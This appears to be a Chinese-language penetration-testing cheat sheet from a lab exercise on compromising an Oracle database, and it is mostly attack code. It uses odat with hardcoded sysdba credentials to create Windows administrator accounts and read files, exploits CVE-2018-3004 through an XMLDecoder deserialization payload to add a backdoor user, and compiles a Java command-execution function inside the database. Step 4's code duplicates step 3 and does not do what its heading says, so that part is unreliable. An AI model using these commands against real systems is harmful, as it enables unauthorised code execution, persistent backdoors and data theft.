[渗透过程中Oracle数据库的利用](https://mp.weixin.qq.com/s/T63BMS8Vt_RpXfPYpzOyHA)

```sh
# 创建用户
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user dotast qwer1234! /add'
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup administrators dotast /add'

# 看提示有 UTL_FILE 则可读取文件
proxychains odat all -s 172.22.14.31 -d orcl -U xradmin -P fcMyE8t9E4XdsKf --sysdba
# UTL_FILE 读取文件
proxychains odat utlfile -s 172.22.14.31 -d orcl -U xradmin -P fcMyE8t9E4XdsKf --test-module --getFile C:/Users/Administrator/flag flag02.txt flag02.txt --sysdba
```

# 方式一、用 CVE-2018-3004 添加远程用户

1. dba 登录

```bash
proxychains sqlplus xradmin/fcMyE8t9E4XdsKf@172.22.14.31:1521/orcl as sysdba
```

2. 创建一个 DecodeMe 类实现 XML 反序列化

```sql
create or replace and compile java source named DecodeMe as
import java.io.*;
import java.beans.*;
public class DecodeMe{
    public static void input(String xml) throws InterruptedException, IOException {

      XMLDecoder decoder = new XMLDecoder ( new ByteArrayInputStream(xml.getBytes()));
      Object object = decoder.readObject();
      System.out.println(object.toString());
      decoder.close();

    }
}
;
/

CREATE OR REPLACE PROCEDURE decodeme (p_xml IN VARCHAR2) IS
    language java name 'DecodeMe.input(java.lang.String)';
/
```

3.添加后门用户：

```sql

BEGIN
  decodeme('
  <java class="java.beans.XMLDecoder">
   <java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="7">
            <void index="0">
                <string>cmd</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>net</string>
            </void>
            <void index="3">
                <string>user</string>
            </void>
            <void index="4">
                <string>benbi</string>
            </void>
            <void index="5">
                <string>pass@123</string>
            </void>
            <void index="6">
                <string>/add</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
  </java>');
END;
/
```

4.再将后门用户添加到管理员组：

```sql

BEGIN
  decodeme('
  <java class="java.beans.XMLDecoder">
   <java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="7">
            <void index="0">
                <string>cmd</string>
            </void>
            <void index="1">
                <string>/c</string>
            </void>
            <void index="2">
                <string>net</string>
            </void>
            <void index="3">
                <string>user</string>
            </void>
            <void index="4">
                <string>benbi</string>
            </void>
            <void index="5">
                <string>pass@123</string>
            </void>
            <void index="6">
                <string>/add</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
  </java>');
END;
/
```

# 方式二、

`xradmin/fcMyE8t9E4XdsKf`

连接上去后发现权限不够，限制了`FilePermission`和`java.lang.RuntimePermission`，通过 oracle 的客户端连接加上 as sysdba 提权

```bash
proxychains sqlplus xradmin/fcMyE8t9E4XdsKf@172.22.14.31:1521/ORCL as sysdba
```

通过如下语句赋予 xradmin 用户权限

```bash
sCALL dbms_java.grant_permission( 'XRADMIN', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' );
CALL dbms_java.grant_permission( 'XRADMIN', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '' );
CALL dbms_java.grant_permission( 'XRADMIN', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' );
```

创建 JAVA Source

```bash
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "LinxUtil" AS
    import java.io.*;
    public class LinxUtil extends Object {
        public static String runCMD(String args) {
            try {
                BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));
                String stemp, str = "";
                while ((stemp = myReader.readLine()) != null) {
                    str += stemp + "\n";
                }
                myReader.close();
                return str;
            } catch (Exception e) {
                return e.toString();
            }
        }
    }
/
```

创建函数

```bash
CREATE OR REPLACE FUNCTION LinxRunCMD(p_cmd IN VARCHAR2)
RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'LinxUtil.runCMD(java.lang.String) return java.lang.String';
/
```

然后执行命令

```bash
select LinxRunCMD('whoami') from dual;
```

这里也可以通过 odat 直接打，注意这里命令无回显，因为是最高权限，直接添加用户连接 3389

```bash
proxychains python3 odat.py dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user dotast qwer1234! /add'
```
